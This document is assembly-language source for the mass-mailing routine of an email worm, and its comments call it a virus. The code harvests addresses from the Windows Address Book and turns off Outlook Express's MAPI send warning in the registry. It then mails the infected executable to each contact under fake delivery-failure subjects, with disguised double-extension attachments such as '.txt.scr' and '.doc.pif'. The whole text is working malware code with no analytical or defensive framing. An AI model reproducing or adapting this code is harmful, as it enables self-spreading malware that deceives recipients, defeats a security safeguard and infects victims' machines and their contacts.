MassMail:
	call	mDelta
mDelta:	pop	ebp
	sub	ebp,offset mDelta
	
	;send the virus to all email addresses that the virus
	;found in the Windows address book file.and temporary
	;internet files
	
	push	(60*1000*5)			
	call	[ebp + Sleep]			;sleep 5 minutes
	
	call	CheckConditions			;check for some conditions before sending mails
	jnc	ExitMT
	
	mov	[ebp + NumberOfMailAddresses],0h
	call	ScanWAB				;get all emails from the WAB
	
	cmp	[ebp + NumberOfMailAddresses],1h
	jbe	FreeWabMemAndExit		;quit if less than 1 mail founded
		
	call	GetMapiApis			;get mapi apis
	jnc	FreeWabMemAndExit
		
	call	DisableMapiWarning		;disable mapi warning	
	
	;logon to mapi
	lea	eax,[ebp + hMapiS]
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	eax
	push	eax
	call	[ebp + _MAPILogon]
	cmp	eax,0h				;success ?
	jne	FreeWabMemAndExit
	
	push	0ffh
	lea	eax,[ebp + InfectedFile]
	push	eax
	push	0h
	call	[ebp + GetModuleFileName]		;get infected file
	

	lea	eax,[ebp + InfectedFile]
	mov	[ebp + lpszPathName],eax
	
	mov	[ebp + ulReserved_],0h
	mov	[ebp + nPosition],-1

	
	movzx	ecx,word ptr [ebp + NumberOfMailAddresses]
	mov	ebx,[ebp + hMailAddresses]

@SendM:	
	push	ecx				;save number of addresses
	push	ebx				;save pointer to addressbook
		
	mov	[ebp + lpszName],ebx
	mov	[ebp + lpszAddress],ebx		;set the reciver address
	
	lea	eax,[ebp + MapiFileDesc]
	mov	[ebp + lpFiles],eax
	mov	[ebp + nFileCount],1h
	
	mov	[ebp + ulReserved],0h
	mov	[ebp + nRecipCount],1h
	
	lea	eax,[ebp + MapiRecipDesc]
	mov	[ebp + lpRecips],eax
	
	mov	[ebp + ulRecipClass],MAPI_TO
	
	;pick random subject
	
	call	GenRandomNumber
	
	and	eax,3000h			;get number between 0 ~ 900h
	
	cmp	eax,1000h
	ja	NxtSub
	lea	eax,[ebp + sub1]
	jmp	SetSub
NxtSub:	cmp	eax,2000h
	ja	NxtSub2
	lea	eax,[ebp + sub2]
	jmp	SetSub
NxtSub2:lea	eax,[ebp + sub3]
SetSub:	mov	[ebp + lpszSubject],eax

	;pick random message
	
	call	GenRandomNumber
	
	and	eax,900h
	
	cmp	eax,300h
	ja	NxtMsg
	lea	eax,[ebp + msg1]
	jmp	SetMsg
NxtMsg:	cmp	eax,600h
	ja	NxtMsg2
	lea	eax,[ebp + msg2]
	jmp	SetMsg
NxtMsg2:lea	eax,[ebp + msg3]
SetMsg:	mov	[ebp + lpszNoteText],eax

	;pick random attachment
	
	call	GenRandomNumber
	
	and	eax,700h			;get rnd number between 0 ~ 700h
	
	cmp	eax,100h
	ja	NxtAtc
	lea	eax,[ebp + atch1]
	jmp	SetAtch
NxtAtc:	cmp	eax,200h
	ja	NxtAtc2
	lea	eax,[ebp + atch2]
	jmp	SetAtch	
NxtAtc2:cmp	eax,300h
	ja	NxtAtc3
	lea	eax,[ebp + atch3]
	jmp	SetAtch
NxtAtc3:cmp	eax,400h
	ja	NxtAtc4
	lea	eax,[ebp + atch4]
	jmp	SetAtch
NxtAtc4:cmp	eax,500h
	ja	NxtAtc5
	lea	eax,[ebp + atch5]
	jmp	SetAtch
NxtAtc5:cmp	eax,600h
	ja	NxtAtc6
	lea	eax,[ebp + atch6]
	jmp	SetAtch
NxtAtc6:lea	eax,[ebp + atch7]
SetAtch:mov	[ebp + lpszFileName],eax
	
	xor	eax,eax
	push	eax
	push	eax
	lea	eax,[ebp + offset MapiMessage]
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	call	[ebp + _MAPISendMail]
	
	
	pop	ebx				;worm address book
		
NextMAdr:
	inc	ebx
	cmp	byte ptr [ebx],0h
	jne	NextMAdr
	inc	ebx	
	
	pop	ecx				;counter of addresses
	dec	ecx
	jcxz	@logoff
	jmp	@SendM
@logoff:xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	[ebp + hMapiS]
	call	[ebp + _MAPILogoff]	
	

FreeWabMemAndExit:
	push	dword ptr [ebp + hMailAddresses]
	call	[ebp + GlobalFree]
ExitMT:	push	eax
	call	[ebp + ExitThread]

MapiMessage:
	ulReserved		dd	0
	lpszSubject 		dd	0
	lpszNoteText 		dd	0
	lpszMessageType 	dd	0
	lpszDateReceived 	dd	0
	lpszConversationID 	dd	0
	flFlags 		dd	0
	lpOriginator 		dd	0
	nRecipCount		dd	0
	lpRecips 		dd	0
	nFileCount		dd	0
	lpFiles			dd	0
    
MapiFileDesc:
	ulReserved_		dd	0
	flFlags_		dd	0
	nPosition		dd	0
	lpszPathName		dd	0
	lpszFileName		dd	0
	lpFileType		dd	0    
    
    
MapiRecipDesc:						;reciver
	ulReserved__		dd	0
	ulRecipClass		dd	MAPI_TO
	lpszName		dd	0
	lpszAddress		dd	0
	ulEIDSize		dd	0
	lpEntryID		dd	0    
	
	MAPI_TO equ 1
	
	InfectedFile	db	0ffh	dup(0)

	MessageNumber	db	0
	
	hMapiS	dd	0
	
;subjects	

sub1	db	"Mail delivery failure",0
sub2	db	"Impartial mail message",0
sub3	db	"Error receiving mail",0

;messages:

msg1	db	"The server could not fully receive an email message which someone",0ah,0dh
	db	"trying to send you. The incomplete message has been added as attachment.",0
		
msg2	db	"Error 569: Mail delivery failure. The email message has been added to the attachments.",0h

msg3	db	"Your message could not be delivered to its target. Please check the attachment for further info.",0h

;attachments:

atch1	db	"partialmessage.TXT.cmd",0
atch2	db	"undelivered.Doc.pif",0
atch3	db	"original.pdf.pif",0
atch4	db	"restored_mail.txt.scr",0
atch5	db	"letter.bat",0
atch6	db	"unrecived.txt.exe",0
atch7	db	"textfile1.txt.scr",0


	
DisableMapiWarning:
	lea	eax,[ebp + hkey]
	push	eax
	push	0h
	push	KEY_QUERY_VALUE
	lea	eax,[ebp + key_name]
	push	eax
	push	HKEY_CURRENT_USER
	call	[ebp + RegOpenKeyEx]
	cmp	eax,0h
	jne	exitDMP
	lea	eax,[ebp + id_size]
	push	eax
	lea	eax,[ebp + user_id]
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	lea	eax,[ebp + id]
	push	eax
	push	[ebp + hkey]
	call	[ebp + RegQueryValueEx]
	cmp	eax,0h
	jne	close_p_keys
	lea	eax,[ebp + hkey2]
	push	eax
	push	KEY_WRITE
	push	0h
	lea	eax,[ebp + user_id]
	push	eax
	push	[ebp + hkey]
	call	[ebp + RegOpenKeyEx]
	cmp	eax,0h
	jne	close_p_keys
	push	[ebp + hkey]
	call	[ebp + RegCloseKey]
	lea	eax,[ebp + hkey]
	push	eax
	push	KEY_WRITE
	push	0h
	lea	eax,[ebp + mapi_k]
	push	eax
	push	[ebp + hkey2]
	call	[ebp + RegOpenKeyEx]
	cmp	eax,0h
	jne	close_p_keys
	push	4h	;dd
	lea	eax,[ebp + protection_off]
	push	eax
	push	REG_DWORD
	push	0h
	lea	eax,[ebp + mapi_virus_p]
	push	eax
	push	[ebp + hkey]
	call	[ebp + RegSetValueEx]
close_p_keys:
	push	[ebp + hkey]
	call	[ebp + RegCloseKey]
	push	[ebp + hkey2]
	call	[ebp + RegCloseKey]
exitDMP:ret
	
		;outlook express protection:
	hkey2	dd	0h
	key_name	db	"Identities",0h
	id	db	"Default User ID",0h
	user_id	db 64h	dup(0h)
	id_size	dd	64h	
	mapi_virus_p	db	"Warn on Mapi Send",0
	mapi_k	db	"Software\Microsoft\Outlook Express\5.0\Mail",0
	protection_off	dd	0h
	REG_DWORD	equ	4h

GetMapiApis:
	call	OverM32
	db	"mapi32.dll",0
OverM32:call	[ebp + LoadLibrary]
	or	eax,eax
	je	GMAFail
	mov	[ebp + hmapi],eax
	xchg	edx,eax
	mov	ecx,MapiApis
	lea	eax,[ebp + mapi_funcs]
	lea	ebx,[ebp + mapi_func_add]
	call	get_apis
	ret
GMAFail:clc
	ret
	

	hmapi		dd	0
mapi_funcs:
	MAPILogon	db	"MAPILogon",0
	MAPILogoff	db	"MAPILogoff",0
	MAPISendMail	db	"MAPISendMail",0
mapi_func_add:	
	_MAPILogon	dd	0
	_MAPILogoff	dd	0
	_MAPISendMail	dd	0
	
	
	MapiApis	equ	3
	
	
CheckConditions:
	;check for internet connection
	lea	eax,[ebp + WinInetDll]
	push	eax
	call	[ebp + LoadLibrary]
	cmp	eax,0h
	je	BadConditions
	xchg	edx,eax
	lea	eax,[ebp + _InternetCheckConnection]
	push	eax
	push	edx
	call	[ebp + __GetProcAddress]
	cmp	eax,0h
	je	BadConditions
	push	0h
	push	FLAG_ICC_FORCE_CONNECTION
	lea	ebx,[ebp + SiteToCheck]
	push	ebx
	call	eax
	cmp	eax,0h				;there is internet connection ?
	je	BadConditions
	push	edx
	call	[ebp + FreeLibrary]
	stc
	ret
BadConditions:
	clc
	ret
	
	
	WinInetDll	db	"Wininet.dll",0
	_InternetCheckConnection	db	"InternetCheckConnectionA",0
	FLAG_ICC_FORCE_CONNECTION	equ	00000001h
	SiteToCheck	db	"http://www.google.com/",0
	




	
;scan the windows address book for email addresses
ScanWAB:				
	mov	dword ptr [ebp + hkey],0h
	lea	eax,[ebp + hkey]
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	lea	eax,[ebp + WAB_Location]
	push	eax
	push	HKEY_CURRENT_USER
	call	[ebp + RegOpenKeyEx]
	cmp	eax,ERROR_SUCCESS
	jne	WabScanErr
	lea	eax,[ebp + SizeOfWAB_PATH]
	push	eax
	lea	eax,[ebp + WAB_Path]
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	[ebp + hkey]
	call	[ebp + RegQueryValueEx]	;get the wab file location
	cmp	eax,ERROR_SUCCESS
	jne	CloseWABkeyAndExit
	push	dword ptr [ebp + hkey]
	call	[ebp + RegCloseKey]
	;open the wab file:
	xor	eax,eax
	push	eax
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	eax
	push	FILE_SHARE_READ
	push	GENERIC_READ
	lea	eax,[ebp + WAB_Path]
	push	eax
	call	[ebp + CreateFile]
	cmp	eax,INVALID_HANDLE_VALUE
	je	WabScanErr
	mov	dword ptr [ebp + hWabFile],eax
	;map the wab file:
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	PAGE_READONLY
	push	eax
	push	dword ptr [ebp + hWabFile]
	call	[ebp + CreateFileMapping]
	cmp	eax,0h
	jne	MapWab
ErrCMF:	push	dword ptr [ebp + hWabFile]	;error close wab file
	call	[ebp + CloseHandle]
	jmp	WabScanErr
MapWab:	mov	[ebp + hWabMap],eax
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	FILE_MAP_READ
	push	dword ptr [ebp + hWabMap]
	call	[ebp + MapViewOfFile]
	cmp	eax,0h
	jne	ReadAddresses
ErrCWM:	push	dword ptr [ebp + hWabMap]	;error close wab map
	call	[ebp + CloseHandle]
	jmp	ErrCMF
ReadAddresses:	
	mov	[ebp +	hWabMapBase],eax
	mov	ax,word ptr [eax + 64h]		;get number of email addresses
	cmp	ax,1h
	jnbe	AllocAddMem
ErrUWF:	push	dword ptr [ebp + hWabMapBase]	;error unmap wab file
	call	[ebp + UnMapViewOfFile]
	jmp	ErrCWM	
AllocAddMem:
	mov	word ptr [ebp + NumberOfMailAddresses],ax
	mov	cx,44h				;every mail address allocated 68 bytes
	mul	cx				;ax = size of allocated memory
	xor	ebx,ebx
	xchg	ax,bx
	push	ebx
	push	GPTR
	call	[ebp + GlobalAlloc]
	cmp	eax,0h
	je	ErrUWF
	mov	[ebp + hMailAddresses],eax
	xchg	eax,ebx
	xor	ecx,ecx
	mov	eax,[ebp + hWabMapBase]
	mov	cx,word ptr [ebp + NumberOfMailAddresses]
	add	eax,[eax + 60h]			;goto start of emails
NxtMail:push	ecx
	mov	ecx,44h
CpyMail:cmp	byte ptr [eax],0h
	je	MovNext
	mov	dl,byte ptr [eax]
	mov	byte ptr [ebx],dl
	inc	ebx
	add	eax,2h
	dec	ecx
	loop	CpyMail
MovNext:add	eax,ecx
	inc	ebx
	mov	byte ptr [ebx],0h
	pop	ecx
	loop	NxtMail
	push	dword ptr [ebp + hWabMapBase]
	call	[ebp + UnMapViewOfFile]
	push	dword ptr [ebp + hWabMap]
	call	[ebp + CloseHandle]
	push	dword ptr [ebp + hWabFile]
	call	[ebp + CloseHandle]
	ret
CloseWABkeyAndExit:
	push	dword ptr [ebp + hkey]
	call	[ebp + RegCloseKey]
WabScanErr:
	ret
	
	
	WAB_Location		db	"Software\Microsoft\WAB\WAB4\Wab File Name",0
	WAB_Path		db	0ffh	dup(0)
	SizeOfWAB_PATH		dd	0ffh
	hWabFile		dd	0
	hWabMap			dd	0
	hWabMapBase		dd	0
	hMailAddresses		dd	0
	NumberOfMailAddresses	dw	0
	